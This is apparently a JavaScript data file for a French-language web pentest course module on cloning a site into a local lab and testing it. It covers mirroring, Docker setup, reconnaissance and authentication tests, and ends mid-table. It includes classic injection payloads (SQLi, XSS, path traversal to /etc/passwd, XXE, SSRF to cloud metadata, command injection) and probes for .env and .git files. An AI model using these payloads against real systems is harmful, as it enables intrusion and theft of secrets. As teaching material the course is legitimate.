export default {
  "id": "m31",
  "num": 31,
  "title": "Clonage local d’un site web et pentest avancé",
  "short": "Clone & Pentest",
  "icon": "🧪",
  "xp": 400,
  "duration": 150,
  "summary": "Module avancé en français : cloner un site web dans un laboratoire local, le reconstruire, cartographier sa surface d'attaque et mener un pentest méthodique avec 10 exercices et 5 CTF détaillés.",
  "objectives": [
    "Distinguer les cas d’usage autorisés et les risques juridiques du clonage d’un site web.",
    "Choisir la méthode de copie adaptée : wget, HTTrack, DevTools, proxy ou crawler.",
    "Reconstruire un site statique ou dynamique localement avec serveur web, PHP et base de données.",
    "Configurer un DNS local, un fichier hosts et un certificat HTTPS de laboratoire.",
    "Cartographier le clone et identifier sa surface d’attaque avec nmap, ffuf, whatweb et Burp/ZAP.",
    "Tester l’authentification, les sessions, les cookies et les jetons JWT.",
    "Tester les injections, la logique métier, les uploads et les API.",
    "Enchaîner plusieurs faiblesses pour mesurer un impact réaliste en laboratoire.",
    "Produire des preuves reproductibles, horodatées et hashées.",
    "Rédiger un rapport professionnel avec des remédiations priorisées et vérifiables."
  ],
  "blocks": [
    {
      "t": "p",
      "x": "<strong>Module 31 — Clonage local d'un site web et pentest avancé</strong>. Ce module avancé explique comment copier un site web dans un laboratoire local, le reconstruire fidèlement, puis mener un test d'intrusion méthodique sur ce clone. Il est destiné aux personnes qui souhaitent comprendre la surface d'attaque d'une application web, reproduire des scénarios de test de façon reproductible et produire un rapport professionnel."
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Durée estimée : 150 min · XP : 400",
      "x": "Travaillez chapitre par chapitre. Les labs utilisent exclusivement des sites de laboratoire ou des applications intentionnellement vulnérables (DVWA, OWASP Juice Shop, WebGoat, bWAPP). Chaque commande doit être exécutée dans un environnement isolé et autorisé."
    },
    {
      "t": "callout",
      "v": "danger",
      "title": "Cadre légal — à lire avant de commencer",
      "x": "Cloner un site web que vous ne possédez pas peut violer le droit d'auteur, les conditions d'utilisation et la législation sur l'accès aux systèmes. Ce module autorise uniquement : (1) vos propres sites, (2) des sites pour lesquels vous disposez d'une autorisation écrite, (3) des applications de lab prévues pour l'entraînement. Ne copiez jamais de données personnelles, de secrets ou de contenus protégés sans base légale. En cas de doute, arrêtez-vous et demandez une validation juridique."
    },
    {
      "t": "h",
      "x": "31.1 Cadre légal, cas d’usage et limites du clonage local"
    },
    {
      "t": "p",
      "x": "Le clonage local consiste à reproduire tout ou partie des ressources d'un site (HTML, CSS, JavaScript, images, polices, endpoints, schémas de base de données) sur une machine que vous contrôlez. L'objectif n'est pas de « pirater » un site distant, mais de disposer d'une copie maîtrisée pour observer, tester et corriger. Un clone n'est jamais parfait : les parties dynamiques, les services tiers, les API et les données en temps réel doivent être reconstruits ou simulés."
    },
    {
      "t": "ul",
      "x": [
        "Formation et démonstration : illustrer une vulnérabilité sur une copie sans toucher à la production.",
        "Test de régression : vérifier qu'une correction fonctionne sur une version représentative.",
        "Migration ou refonte : analyser les dépendances, les assets et les parcours avant de remplacer une plateforme.",
        "Archivage autorisé : conserver une preuve technique d'un état du site pour un audit.",
        "Reproduction de bug : isoler un défaut signalé par un utilisateur ou un scanner.",
        "Analyse de malware web : étudier un site compromis dans une VM isolée, sans risque de propagation.",
        "Test de résilience : simuler des pics de charge ou des scénarios de panne sur un clone.",
        "Recherche : comparer des implémentations et mesurer l'impact de configurations de sécurité."
      ]
    },
    {
      "t": "table",
      "head": [
        "Méthode",
        "Cas d’usage privilégié",
        "Limites principales",
        "Risque si mal utilisée"
      ],
      "rows": [
        [
          "Navigation + « Enregistrer sous »",
          "Page statique simple, capture ponctuelle",
          "Ne capture pas les appels API, les sessions ni le rendu JavaScript complexe",
          "Contenu incomplet, données sensibles en cache"
        ],
        [
          "wget --mirror",
          "Site statique, documentation, assets publics",
          "Pas de rendu JS, liens dynamiques cassés, authentification limitée",
          "Empreinte réseau, téléchargement massif"
        ],
        [
          "HTTrack",
          "Site statique de taille moyenne, archivage rapide",
          "JavaScript/API non capturés, réécriture parfois imparfaite",
          "Copie de contenus protégés"
        ],
        [
          "DevTools → Save all",
          "Débogage d’une page, récupération de ressources",
          "Ressources manquantes, ordre de chargement non garanti",
          "Exposition de jetons dans les copies"
        ],
        [
          "Proxy (Burp, ZAP, mitmproxy)",
          "Site authentifié, API, parcours métier",
          "Configuration TLS/proxy, volume important, nettoyage nécessaire",
          "Capture de données personnelles"
        ],
        [
          "Crawler personnalisé",
          "Besoin spécifique, APIs, pagination",
          "Développement et maintenance, gestion des erreurs",
          "Charge excessive si mal limité"
        ]
      ]
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Vérifier l’autorisation",
          "p": "Identifiez le propriétaire du site, la base légale et le périmètre exact. Pour un lab, utilisez une application prévue pour l'entraînement ou un site que vous avez créé."
        },
        {
          "h": "Étape 2 — Isoler la machine",
          "p": "Travaillez dans une VM ou un conteneur avec un réseau host-only. Désactivez les partages de dossiers non nécessaires et prenez un snapshot avant toute manipulation."
        },
        {
          "h": "Étape 3 — Créer le dossier de mission",
          "p": "Séparez les preuves, les clones, les journaux, les configurations et le rapport. Utilisez des noms explicites et horodatez chaque étape."
        },
        {
          "h": "Étape 4 — Définir les limites",
          "p": "Notez ce qui est interdit : données réelles, comptes de production, services tiers, tests de déni de service, exfiltration. Écrivez une règle d'arrêt."
        },
        {
          "h": "Étape 5 — Journaliser",
          "p": "Enregistrez les commandes, les URLs, les horodatages et les résultats. Le journal est la base de la reproductibilité et de la preuve."
        },
        {
          "h": "Étape 6 — Nettoyer",
          "p": "À la fin, supprimez les données sensibles, les comptes de test et les fichiers temporaires. Conservez uniquement les preuves nécessaires, chiffrées si besoin."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Initialisation du laboratoire et du journal de mission",
      "x": "# LAB AUTORISÉ UNIQUEMENT — cible locale ou application vulnérable prévue\nmkdir -p lab/m31/{clone,site,db,logs,preuves,rapport,config}\ndate -Iseconds | tee lab/m31/logs/start.txt\nprintf \"Cible: 127.0.0.1 (lab)\\nInterdit: hors local, DoS, donnees reelles\\n\" > lab/m31/config/scope.txt\nprintf \"Snapshot VM: a verifier avant chaque etape\\n\" > lab/m31/config/checklist.txt\nsha256sum lab/m31/config/scope.txt | tee lab/m31/preuves/scope.sha256"
    },
    {
      "t": "mini",
      "items": [
        {
          "v": "lime",
          "h": "À faire",
          "p": "Utiliser une cible de lab, isoler le réseau, journaliser, hasher les preuves et limiter la conservation des données."
        },
        {
          "v": "amber",
          "h": "À éviter",
          "p": "Cloner un site tiers sans autorisation, contourner une authentification réelle, conserver des données personnelles ou des secrets."
        },
        {
          "v": "red",
          "h": "Risque",
          "p": "Violation du droit d'auteur, accès non autorisé, fuite de données, atteinte à l'image et responsabilité pénale ou civile."
        }
      ]
    },
    {
      "t": "h",
      "x": "31.2 Méthodes de copie d’un site : statique, dynamique et authentifié"
    },
    {
      "t": "p",
      "x": "La première décision consiste à distinguer un site <strong>statique</strong> (fichiers HTML/CSS/JS servis tels quels) d'un site <strong>dynamique</strong> (rendu côté serveur, API, base de données, sessions). Un site statique se clone facilement avec wget ou HTTrack. Un site dynamique nécessite souvent un proxy, une reconstruction de base de données et une réimplémentation des services externes. Dans tous les cas, le clone doit rester dans le périmètre autorisé."
    },
    {
      "t": "table",
      "head": [
        "Outil / méthode",
        "Forces",
        "Faiblesses",
        "Quand l’utiliser"
      ],
      "rows": [
        [
          "wget",
          "Disponible partout, options de miroir, conversion des liens",
          "Pas de JavaScript, gestion limitée des sessions",
          "Site statique, documentation, assets publics"
        ],
        [
          "HTTrack",
          "Interface simple, reprise, rewriting",
          "Rendu JS absent, APIs non capturées",
          "Site statique de taille moyenne"
        ],
        [
          "SiteSucker (macOS)",
          "Simple, capture de pages",
          "Moins scriptable, limites sur les gros sites",
          "Capture ponctuelle sur macOS"
        ],
        [
          "DevTools (Save all)",
          "Voir exactement les ressources chargées",
          "Manuel, incomplet, jetons exposés",
          "Débogage d’une page précise"
        ],
        [
          "Burp/ZAP/mitmproxy",
          "Capture authentifiée, APIs, modification des requêtes",
          "Configuration, volume, nettoyage",
          "Site dynamique, parcours métier, API"
        ],
        [
          "Crawler custom",
          "Contrôle total, pagination, APIs",
          "Développement, robustesse",
          "Besoin spécifique ou recherche"
        ]
      ]
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Choisir la cible",
          "p": "Pour ce lab, utilisez un site statique fourni dans un dossier local ou une application vulnérable. Notez l'URL de départ et les chemins exclus."
        },
        {
          "h": "Étape 2 — Tester wget",
          "p": "Lancez un miroir limité au domaine, sans sortir du périmètre, avec conversion des liens et récupération des ressources nécessaires."
        },
        {
          "h": "Étape 3 — Vérifier le rendu",
          "p": "Ouvrez le clone dans un navigateur, comparez les pages, les images, les feuilles de style et les scripts. Notez les ressources manquantes."
        },
        {
          "h": "Étape 4 — Tester HTTrack",
          "p": "Clonez le même site avec HTTrack et comparez le nombre de fichiers et le rendu. HTTrack peut mieux réécrire certains liens, mais reste limité sur le JS."
        },
        {
          "h": "Étape 5 — Passer au proxy si nécessaire",
          "p": "Si le site utilise une authentification ou des API, configurez un proxy sur votre navigateur de lab, capturez les requêtes et exportez les ressources utiles."
        },
        {
          "h": "Étape 6 — Documenter les limites",
          "p": "Listez ce qui n'a pas été capturé : appels API, websockets, services de paiement, captchas, contenus personnalisés. Ces limites seront importantes pour interpréter les tests."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Miroir avec wget — options expliquées",
      "x": "# LAB AUTORISÉ UNIQUEMENT — remplacer l URL par votre cible de lab\nTARGET=\"http://127.0.0.1:8080\"\nOUT=\"lab/m31/clone/wget\"\n\nwget \\\n  --mirror \\\n  --convert-links \\\n  --adjust-extension \\\n  --page-requisites \\\n  --no-parent \\\n  --domains=127.0.0.1 \\\n  --wait=0.5 \\\n  --random-wait \\\n  --limit-rate=500k \\\n  --user-agent=\"M31-Lab-Mirror/1.0\" \\\n  -P \"$OUT\" \\\n  \"$TARGET/\"\n\n# Vérifications\nfind \"$OUT\" -type f | wc -l\ngrep -RIl \"href=\\\"http\" \"$OUT\" | head\ndu -sh \"$OUT\""
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Lancer HTTrack",
          "p": "Utilisez un dossier de sortie distinct pour comparer avec wget. Limitez la profondeur et le débit pour ne pas surcharger la cible de lab."
        },
        {
          "h": "Étape 2 — Vérifier les logs",
          "p": "HTTrack écrit un journal et un fichier de cache. Consultez-les pour identifier les erreurs 404, les redirections et les ressources ignorées."
        },
        {
          "h": "Étape 3 — Comparer",
          "p": "Comparez le nombre de fichiers, les tailles et le rendu. Identifiez les pages qui fonctionnent avec wget mais pas HTTrack, et inversement."
        },
        {
          "h": "Étape 4 — Corriger",
          "p": "Récupérez manuellement les ressources manquantes ou ajustez les options. Documentez chaque correction."
        },
        {
          "h": "Étape 5 — Archiver",
          "p": "Compressez le clone, calculez son hash et conservez la commande exacte utilisée."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Miroir avec HTTrack et comparaison",
      "x": "# LAB AUTORISÉ UNIQUEMENT\nhttrack \"http://127.0.0.1:8080/\" -O \"lab/m31/clone/httrack\" -%v --max-depth=5 --max-rate=500000\n\n# Comparaison rapide\nfind lab/m31/clone/wget -type f | wc -l\nfind lab/m31/clone/httrack -type f | wc -l\ndiff -qr lab/m31/clone/wget lab/m31/clone/httrack | head -40"
    },
    {
      "t": "p",
      "x": "Pour un site dynamique, le proxy est souvent indispensable. Configurez le navigateur du lab pour passer par Burp ou ZAP, installez le certificat du proxy dans la VM, puis parcourez le site avec un compte de test. Exportez les requêtes pertinentes, les cookies, les jetons et les réponses. Ne capturez pas de données personnelles réelles ; utilisez des comptes et des contenus de lab."
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Capture via proxy et export des ressources",
      "x": "# LAB AUTORISÉ UNIQUEMENT\n# 1) Configurer le navigateur pour utiliser 127.0.0.1:8080 (Burp) ou 127.0.0.1:8081 (ZAP)\n# 2) Importer le certificat du proxy dans la VM de lab\n# 3) Parcourir le site avec un compte de test\n# 4) Exporter les requêtes/réponses utiles depuis le proxy\n\n# Alternative CLI avec mitmproxy\nmitmproxy --mode regular --listen-port 8080\n# Dans une autre console, utiliser curl avec le proxy\ncurl -x http://127.0.0.1:8080 -k -c lab/m31/clone/cookies.txt http://site.local/\n\n# Vérifier les cookies et les en-têtes de sécurité\ncurl -I -k http://site.local/"
    },
    {
      "t": "callout",
      "v": "warn",
      "title": "Limite importante du clonage",
      "x": "Un clone local ne prouve pas que le site distant est vulnérable. Il sert à comprendre, reproduire et corriger dans un cadre contrôlé. Les résultats obtenus sur un clone doivent être revalidés sur l'environnement autorisé avant toute conclusion."
    },
    {
      "t": "mini",
      "items": [
        {
          "v": "lime",
          "h": "Réflexe",
          "p": "Commencer simple (wget), comparer (HTTrack), puis passer au proxy seulement si le site est dynamique ou authentifié."
        },
        {
          "v": "amber",
          "h": "Piège",
          "p": "Croire qu'un clone complet suffit : les API, le rendu JavaScript et les services tiers manquent souvent."
        },
        {
          "v": "red",
          "h": "Interdit",
          "p": "Cloner un site tiers, contourner des protections réelles ou conserver des données personnelles capturées par le proxy."
        }
      ]
    },
    {
      "t": "h",
      "x": "31.3 Reconstruction de l’environnement local : serveur web, PHP et base de données"
    },
    {
      "t": "p",
      "x": "Un clone statique peut être servi par un simple serveur HTTP. Un clone dynamique nécessite un environnement d'exécution compatible : version de PHP/Python/Node, extensions, serveur web, base de données, variables d'environnement et parfois des services externes simulés. Docker Compose est idéal pour reproduire cet ensemble de façon reproductible et jetable."
    },
    {
      "t": "code",
      "lang": "text",
      "title": "docker-compose.yml — pile de lab web + base de données",
      "x": "services:\n  web:\n    image: php:8.2-apache\n    container_name: m31_web\n    ports:\n      - \"8080:80\"\n    volumes:\n      - ./site:/var/www/html\n    depends_on:\n      - db\n    environment:\n      APP_ENV: lab\n\n  db:\n    image: mariadb:11\n    container_name: m31_db\n    environment:\n      MARIADB_ROOT_PASSWORD: labroot\n      MARIADB_DATABASE: labdb\n      MARIADB_USER: labuser\n      MARIADB_PASSWORD: labpass\n    volumes:\n      - ./db:/docker-entrypoint-initdb.d\n\n  adminer:\n    image: adminer:latest\n    container_name: m31_adminer\n    ports:\n      - \"8081:8080\"\n    depends_on:\n      - db"
    },
    {
      "t": "code",
      "lang": "text",
      "title": "VirtualHost Nginx/Apache et import de base",
      "x": "# Exemple Nginx (à placer dans conf.d/site.conf)\nserver {\n    listen 80;\n    server_name site.local;\n    root /var/www/site;\n    index index.php index.html;\n\n    location / {\n        try_files $uri $uri/ /index.php?$query_string;\n    }\n\n    location ~ \\.php$ {\n        include fastcgi_params;\n        fastcgi_pass php:9000;\n        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n    }\n}\n\n# Import d un dump de lab dans MariaDB\ndocker exec -i m31_db mariadb -u root -plabroot labdb < lab/m31/db/backup.sql\n\n# Vérification\ndocker exec -it m31_db mariadb -u root -plabroot -e \"SHOW TABLES;\" labdb"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Identifier les prérequis",
          "p": "Lisez la documentation du site de lab : version de PHP, extensions, base de données, variables d'environnement, dépendances Composer/NPM."
        },
        {
          "h": "Étape 2 — Préparer les fichiers",
          "p": "Placez le clone dans le dossier monté par le conteneur. Vérifiez les permissions et les chemins absolus dans les fichiers de configuration."
        },
        {
          "h": "Étape 3 — Démarrer la pile",
          "p": "Lancez docker compose up -d, puis consultez les logs. Corrigez les erreurs de connexion à la base et les extensions manquantes."
        },
        {
          "h": "Étape 4 — Importer la base",
          "p": "Importez le dump de lab, vérifiez les tables et les utilisateurs. Ne réutilisez jamais un dump de production contenant des données personnelles."
        },
        {
          "h": "Étape 5 — Configurer l’application",
          "p": "Adaptez les fichiers de configuration locaux (host, port, identifiants de lab). Utilisez des secrets factices et un fichier .env non versionné."
        },
        {
          "h": "Étape 6 — Tester le parcours",
          "p": "Parcourez les pages principales, testez la connexion, la recherche, l'upload et les API. Notez les fonctionnalités cassées."
        },
        {
          "h": "Étape 7 — Figer l’état",
          "p": "Prenez un snapshot ou un commit du dossier de lab. Documentez les versions d'images Docker et les commandes de démarrage."
        }
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Alternatives légères pour servir un clone statique",
      "x": "# Python 3\npython3 -m http.server 8080 --directory lab/m31/site\n\n# PHP intégré (pour du PHP simple)\nphp -S 127.0.0.1:8080 -t lab/m31/site\n\n# Node (si le site est une SPA statique)\nnpx serve lab/m31/site -l 8080\n\n# Vérifier que le serveur répond\ncurl -I http://127.0.0.1:8080/"
    },
    {
      "t": "table",
      "head": [
        "Symptôme",
        "Cause probable",
        "Solution"
      ],
      "rows": [
        [
          "Erreur 500",
          "Extension PHP manquante ou permission refusée",
          "Consulter les logs, installer l’extension, corriger les droits"
        ],
        [
          "Page blanche",
          "Erreur PHP masquée ou chemin de configuration incorrect",
          "Activer les logs de lab, vérifier le DocumentRoot"
        ],
        [
          "Connexion base refusée",
          "Host/port/identifiants incorrects ou base non démarrée",
          "Vérifier docker compose ps et le fichier .env"
        ],
        [
          "Assets 404",
          "Chemins absolus ou rewriting absent",
          "Configurer le VirtualHost et les règles de réécriture"
        ],
        [
          "Session perdue",
          "Cookie de domaine différent ou SameSite",
          "Utiliser le bon host local et vérifier les attributs du cookie"
        ],
        [
          "API en erreur",
          "Service externe absent ou URL codée en dur",
          "Simuler le service ou adapter la configuration de lab"
        ],
        [
          "Rendu JavaScript cassé",
          "Build non exécuté ou ressources bloquées",
          "Lancer le build, vérifier la console et les CORS"
        ]
      ]
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "Bonne pratique",
      "x": "Conservez un fichier <code>README.md</code> dans le dossier de lab avec les versions, les commandes de démarrage, les comptes de test et les limites connues. Un clone reproductible vaut beaucoup plus qu'un clone qui ne fonctionne que sur votre machine."
    },
    {
      "t": "h",
      "x": "31.4 DNS local, fichier hosts et HTTPS de laboratoire"
    },
    {
      "t": "p",
      "x": "Un clone doit souvent répondre au nom de domaine d'origine pour que les cookies, les redirections et les configurations fonctionnent. Vous pouvez utiliser le fichier <code>hosts</code> de votre machine ou un serveur DNS local. Pour HTTPS, générez un certificat de lab et faites confiance à votre autorité locale uniquement dans la VM de test."
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Résolution locale et certificat de lab",
      "x": "# Linux/macOS — ajouter une entrée hosts (lab uniquement)\nsudo sh -c 'echo \"127.0.0.1 site.local\" >> /etc/hosts'\n\n# Windows PowerShell (à exécuter en administrateur, VM de lab)\nAdd-Content -Path \"$env:SystemRoot/System32/drivers/etc/hosts\" -Value \"127.0.0.1 site.local\"\n\n# Vérification\nping site.local\ngetent hosts site.local\n\n# Certificat auto-signé de lab (valable 365 jours)\nopenssl req -x509 -newkey rsa:2048 -nodes \\\n  -keyout lab/m31/config/site.key \\\n  -out lab/m31/config/site.crt \\\n  -days 365 \\\n  -subj \"/CN=site.local\" \\\n  -addext \"subjectAltName=DNS:site.local\"\n\n# Alternative avec mkcert (autorité locale de développement)\nmkcert -install\nmkcert site.local\n\n# Tester HTTPS en forçant la résolution\ncurl -k --resolve site.local:443:127.0.0.1 https://site.local/"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Choisir un nom",
          "p": "Utilisez un nom réservé au lab, par exemple site.local ou app.test. N'utilisez pas un domaine réel que vous ne contrôlez pas."
        },
        {
          "h": "Étape 2 — Configurer la résolution",
          "p": "Ajoutez l'entrée dans le fichier hosts de la VM. Vérifiez avec ping et getent. En cas de cache DNS, videz-le ou utilisez un navigateur sans cache."
        },
        {
          "h": "Étape 3 — Générer le certificat",
          "p": "Créez un certificat avec le bon CN et le bon SAN. Placez la clé et le certificat dans le dossier de configuration du serveur."
        },
        {
          "h": "Étape 4 — Configurer le serveur",
          "p": "Activez HTTPS sur le VirtualHost, indiquez les chemins du certificat et de la clé, puis redémarrez le service."
        },
        {
          "h": "Étape 5 — Tester",
          "p": "Testez avec curl, le navigateur et l'outil de proxy. Vérifiez que les cookies Secure et les redirections fonctionnent correctement."
        }
      ]
    },
    {
      "t": "callout",
      "v": "info",
      "title": "Pourquoi c’est important",
      "x": "Beaucoup de vulnérabilités web dépendent du domaine, des cookies, des en-têtes Origin/Referer et des redirections. Travailler avec le bon nom local évite les faux négatifs et permet de reproduire fidèlement les parcours."
    },
    {
      "t": "callout",
      "v": "warn",
      "title": "Ne touchez pas au hosts de production",
      "x": "La modification du fichier hosts peut affecter d'autres applications. Faites-le uniquement dans une VM de lab dédiée et documentez la modification pour pouvoir la retirer."
    },
    {
      "t": "h",
      "x": "31.5 Cartographie et reconnaissance du clone"
    },
    {
      "t": "p",
      "x": "Une fois le clone accessible, commencez par cartographier sa surface : ports, services, technologies, répertoires, fichiers exposés, points d'entrée et mécanismes d'authentification. La reconnaissance doit rester proportionnée et non destructive. Sur un clone local, vous pouvez être plus exhaustif, mais gardez les mêmes règles de journalisation."
    },
    {
      "t": "table",
      "head": [
        "Outil",
        "Objectif",
        "Exemple de commande",
        "Remarque"
      ],
      "rows": [
        [
          "nmap",
          "Ports et services",
          "nmap -sV -p- 127.0.0.1",
          "Sur un clone local, vérifier les ports réellement exposés"
        ],
        [
          "whatweb",
          "Technologies web",
          "whatweb http://site.local",
          "Version serveur, CMS, frameworks"
        ],
        [
          "ffuf",
          "Découverte de chemins",
          "ffuf -u http://site.local/FUZZ -w wordlist",
          "Filtrer les codes 200/301/302/403"
        ],
        [
          "gobuster",
          "Découverte de répertoires",
          "gobuster dir -u http://site.local -w wordlist",
          "Alternative à ffuf"
        ],
        [
          "nikto",
          "Mauvaise configuration",
          "nikto -h http://site.local",
          "Bruyant, à réserver au lab"
        ],
        [
          "curl",
          "Vérification manuelle",
          "curl -i http://site.local/robots.txt",
          "Contrôle des en-têtes et du contenu"
        ],
        [
          "Burp/ZAP",
          "Cartographie interactive",
          "Proxy + spider",
          "Idéal pour les parcours authentifiés"
        ]
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Reconnaissance du clone local",
      "x": "# LAB AUTORISÉ UNIQUEMENT\nTARGET=\"http://site.local\"\n\n# 1) Ports et services\nnmap -sV -p- 127.0.0.1 -oN lab/m31/logs/nmap.txt\n\n# 2) Technologies\nwhatweb -a 3 \"$TARGET\" | tee lab/m31/logs/whatweb.txt\n\n# 3) Fichiers et répertoires\nffuf -u \"$TARGET/FUZZ\" -w /usr/share/wordlists/dirb/common.txt \\\n  -mc 200,301,302,403 -of json -o lab/m31/logs/ffuf.json\n\n# 4) Fichiers sensibles classiques\nfor f in robots.txt sitemap.xml .git/HEAD .env backup.zip db.sql; do\n  echo \"== $f ==\"; curl -s -o /dev/null -w \"%{http_code}\\n\" \"$TARGET/$f\";\ndone\n\n# 5) En-têtes de sécurité\ncurl -s -D - -o /dev/null \"$TARGET/\" | tee lab/m31/logs/headers.txt"
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Identifier les technologies",
          "p": "Utilisez whatweb et les en-têtes HTTP pour connaître le serveur, le langage, le framework et le CMS. Notez les versions exactes."
        },
        {
          "h": "Étape 2 — Découvrir les chemins",
          "p": "Lancez ffuf ou gobuster avec une wordlist adaptée. Filtrez les réponses pertinentes et vérifiez manuellement les endpoints intéressants."
        },
        {
          "h": "Étape 3 — Chercher les fichiers exposés",
          "p": "Testez les fichiers de sauvegarde, de configuration, les dépôts Git, les dumps SQL et les fichiers de log. Sur un clone, ces fichiers peuvent contenir des secrets de lab."
        },
        {
          "h": "Étape 4 — Cartographier les parcours",
          "p": "Parcourez le site avec un compte de test et notez les formulaires, les paramètres, les cookies, les jetons et les appels API."
        },
        {
          "h": "Étape 5 — Classer les points d’entrée",
          "p": "Classez par type : authentification, recherche, upload, API, admin, paiement. Priorisez ceux qui manipulent des données ou des privilèges."
        },
        {
          "h": "Étape 6 — Consigner",
          "p": "Enregistrez les URLs, les codes de réponse, les captures et les hypothèses. La carte de reconnaissance servira de base aux chapitres suivants."
        }
      ]
    },
    {
      "t": "callout",
      "v": "tip",
      "title": "Astuce avancée",
      "x": "Sur un clone, comparez les réponses avec et sans authentification. Un endpoint qui répond différemment selon le cookie est souvent un point d'entrée intéressant pour tester le contrôle d'accès."
    },
    {
      "t": "h",
      "x": "31.6 Authentification, sessions et contrôle d’accès"
    },
    {
      "t": "p",
      "x": "Les faiblesses d'authentification et de session sont fréquentes : identifiants par défaut, politiques de mot de passe faibles, cookies mal configurés, fixation de session, jetons JWT mal vérifiés, absence de contrôle d'accès côté serveur. Sur un clone de lab, testez chaque mécanisme avec des comptes de test et documentez précisément les requêtes."
    },
    {
      "t": "ul",
      "x": [
        "Identifiants par défaut ou comptes de démonstration oubliés (admin/admin, test/test).",
        "Politique de mot de passe faible, absence de limitation des tentatives, énumération de comptes.",
        "Cookie de session sans HttpOnly, Secure ou SameSite, durée de vie excessive.",
        "Fixation de session : l'identifiant ne change pas après authentification.",
        "JWT sans vérification de signature, algorithme none, secret faible, expiration absente.",
        "Contrôle d'accès uniquement côté client (menus masqués, JavaScript).",
        "IDOR : accès à l'objet d'un autre utilisateur en changeant un identifiant.",
        "Élévation de privilèges par modification d'un rôle, d'un champ caché ou d'un en-tête."
      ]
    },
    {
      "t": "code",
      "lang": "text",
      "title": "Tests d’authentification, de cookies et de JWT",
      "x": "# LAB AUTORISÉ UNIQUEMENT\nTARGET=\"http://site.local\"\n\n# 1) Identifiants par défaut (compte de lab)\ncurl -i -c lab/m31/logs/cookies.txt \\\n  -d \"username=admin&password=admin\" \"$TARGET/login.php\"\n\n# 2) Cookie de session et attributs\ncurl -i -b lab/m31/logs/cookies.txt \"$TARGET/admin.php\"\ngrep -i \"set-cookie\" lab/m31/logs/headers.txt\n\n# 3) Fixation de session : comparer l ID avant/après connexion\ncurl -c before.txt \"$TARGET/login.php\" > /dev/null\ncurl -b before.txt -c after.txt -d \"username=user&password=user\" \"$TARGET/login.php\"\ndiff <(grep -o \"PHPSESSID[^;]*\" before.txt) <(grep -o \"PHPSESSID[^;]*\" after.txt)\n\n# 4) Décoder un JWT (sans le falsifier sur un système réel)\npython3 - <<'PY'\nimport base64, json\ntoken = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ.signature\"\nfor part in token.split(\".\")[:2]:\n    part += \"=\" * (-len(part) % 4)\n    print(json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))\nPY\n\n# 5) Test IDOR avec deux comptes de lab\ncurl -s -b lab/m31/logs/cookies.txt \"$TARGET/api/users/1\"\ncurl -s -b lab/m31/logs/cookies.txt \"$TARGET/api/users/2\""
    },
    {
      "t": "steps",
      "items": [
        {
          "h": "Étape 1 — Créer deux comptes de test",
          "p": "Utilisez un compte standard et un compte administrateur de lab. Notez leurs identifiants et leurs rôles."
        },
        {
          "h": "Étape 2 — Tester la connexion",
          "p": "Vérifiez les identifiants par défaut, la robustesse de la politique de mot de passe et la présence d'une limitation des tentatives."
        },
        {
          "h": "Étape 3 — Analyser la session",
          "p": "Inspectez les cookies, leur durée de vie, les attributs HttpOnly/Secure/SameSite et le changement d'identifiant après connexion."
        },
        {
          "h": "Étape 4 — Tester les jetons",
          "p": "Décodez les JWT, vérifiez la signature, l'algorithme, l'expiration et les rôles. Ne falsifiez que dans le lab."
        },
        {
          "h": "Étape 5 — Tester le contrôle d’accès",
          "p": "Essayez d'accéder aux pages admin avec un compte standard, de changer un identifiant d'objet et de modifier un rôle dans une requête."
        },
        {
          "h": "Étape 6 — Documenter",
          "p": "Pour chaque défaut, conservez la requête, la réponse, le rôle utilisé et la preuve d'impact. Proposez une correction côté serveur."
        }
      ]
    },
    {
      "t": "callout",
      "v": "warn",
      "title": "Ne testez pas les comptes réels",
      "x": "N'utilisez jamais de identifiants réels, de cookies de production ou de jetons personnels. Créez des comptes dédiés au lab et révoquez-les après le test."
    },
    {
      "t": "h",
      "x": "31.7 Injections, logique métier et faiblesses côté serveur"
    },
    {
      "t": "p",
      "x": "Les injections exploitent une confusion entre données et code. Les plus classiques sont SQLi, XSS, CSRF, LFI/RFI, SSRF, injection de commandes, XXE et désérialisation. Les failles de logique métier sont différentes : le code fonctionne comme prévu, mais les règles métier sont contournables (prix négatif, quantité, séquence d'étapes, confiance dans le client)."
    },
    {
      "t": "table",
      "head": [
        "Famille",
        "Principe",
        "Exemple de test de lab",
        "Correction principale"
      ],
      "rows": [
        [
          "SQLi",
          "Donnée injectée dans une requête SQL",
          "' OR '1'='1' --",
          "Requêtes paramétrées, validation, moindre privilège DB"
        ],
        [
          "XSS",
          "Script injecté dans une page",
          "<script>alert(document.domain)</script>",
          "Encodage contextuel, CSP, validation"
        ],
        [
          "CSRF",
          "Action déclenchée à l’insu de l’utilisateur",
          "Formulaire auto-soumis",
          "Jeton anti-CSRF, SameSite, vérification Origin"
        ],
        [
          "LFI/RFI",
          "Inclusion de fichier contrôlée",
          "../../../../etc/passwd",
          "Liste blanche, chemins fixes, pas d’inclusion dynamique"
        ],
        [
          "SSRF",
          "Requête serveur vers une URL contrôlée",
          "http://169.254.169.254/",
          "Liste blanche, blocage des IP internes, résolution contrôlée"
        ],
        [
          "Command injection",
          "Commande système construite avec une entrée",
          "; id",
          "Éviter le shell, utiliser des API, valider"
        ],
        [
          "XXE",
          "Entité XML externe",
          "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
          "Désactiver les entités externes"
        ],
        [
          "Désérialisation",
          "Objet non fiable désérialisé",
          "Payload spécifique au framework",
          "Éviter la désérialisation non fiable, signatures"
        ],
        [
          "Logique métier",
